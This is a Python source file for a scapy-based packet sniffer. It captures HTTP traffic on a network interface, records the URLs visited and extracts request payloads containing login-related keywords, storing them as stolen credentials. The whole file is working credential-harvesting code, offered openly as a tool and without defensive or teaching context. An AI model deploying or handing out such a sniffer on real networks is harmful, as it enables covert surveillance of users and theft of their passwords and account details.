"""
packet_sniffer.py - packet sniffer that catches HTTP packets and filters out
all URLs visited and payloads associated with login information.
"""

import scapy.all
from scapy.layers.http import HTTPRequest
from scapy.sendrecv import AsyncSniffer


def get_url(packet: scapy.layers.l2.Ether) -> str:
    """Get the HTTP Request's link and return it as URL string."""
    return (packet[HTTPRequest].Host + packet[HTTPRequest].Path).decode(errors="ignore")


def get_login_info(packet: scapy.layers.l2.Ether) -> str:
    """Get potential login information by searching for keywords possibly associated with input forms on websites."""
    if packet.haslayer(scapy.all.Raw):
        load = packet[scapy.all.Raw].load.decode(errors="ignore")
        keywords = ["user", "usr", "name", "login", "mail",
                    "password", "pass", "pwd"]
        if any(keyword in load.lower() for keyword in keywords):
            return load


class PacketSniffer:
    """Manage AsyncSniffer while holding useful data and exchanging it with the user interface.

    Attributes:
        console_output (list) - store all found information (URLs and login info) in a list
        credentials (list) - store only login information in this separate attribute
        async_sniffer (AsyncSniffer) - scapy's AsyncSniffer object used for sniffing asynchronously

    Methods:
        process_sniffed_packet(packet) - function used on each packet by AsyncSniffer
        start_sniffer() - order AsyncSniffer to start
        stop_sniffer() - order AsyncSniffer to stop
        is_running() - check whether AsyncSniffer is currently running
    """
    def __init__(self, interface: str = "eth0") -> None:
        """Initialize empty lists for console_output and credentials. Create AsyncSniffer object."""
        self.console_output = []
        self.credentials = []
        # AsyncSniffer could not be extended as a class because of problems with "prn" keyword.
        self.async_sniffer = AsyncSniffer(iface=interface, store=False, prn=self.process_sniffed_packet)

    def process_sniffed_packet(self, packet: scapy.layers.l2.Ether) -> None:
        """Extract data from a packet and store it in console_output and credentials attributes."""
        if packet.haslayer(HTTPRequest):
            url = get_url(packet)
            self.console_output.append(url)
            login_info = get_login_info(packet)
            if login_info:
                self.console_output.append("[LOGIN INFO]: " + login_info)
                self.credentials.append(login_info)

    def start_sniffer(self) -> None:
        """Order AsyncSniffer to start."""
        self.async_sniffer.start()

    def stop_sniffer(self) -> None:
        """Order AsyncSniffer to stop."""
        self.async_sniffer.stop()

    def is_running(self) -> bool:
        """Check whether AsyncSniffer is currently running."""
        return self.async_sniffer.running
